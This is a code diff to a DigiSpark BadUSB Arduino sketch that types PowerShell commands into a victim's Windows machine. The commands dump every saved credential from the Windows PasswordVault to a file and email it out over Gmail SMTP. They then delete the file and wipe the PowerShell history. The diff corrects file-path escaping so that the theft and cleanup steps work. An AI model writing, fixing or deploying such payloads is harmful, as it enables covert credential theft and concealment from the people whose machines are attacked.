@@ -17,10 +17,10 @@ void loop() {
     DigiKeyboard.print("[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ } | Out-File -FilePath C:\\temp.txt");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(1000);
-    DigiKeyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_EMAIL@gmail.com', 'YOUR_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUR_EMAIL@gmail.com'; $ReportEmail.To.Add('SEND_EMAIL_TO'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report.'; $ReportEmail.Attachments.Add('C:\temp.txt'); $SMTPInfo.Send($ReportEmail)");
+    DigiKeyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_EMAIL@gmail.com', 'YOUR_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUR_EMAIL@gmail.com'; $ReportEmail.To.Add('SEND_EMAIL_TO'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report.'; $ReportEmail.Attachments.Add('C:\\temp.txt'); $SMTPInfo.Send($ReportEmail)");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(1000);
-    DigiKeyboard.print("rm temp.txt");
+    DigiKeyboard.print("rm C:\\temp.txt");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
     DigiKeyboard.print("Remove-Item (Get-PSreadlineOption).HistorySavePath");
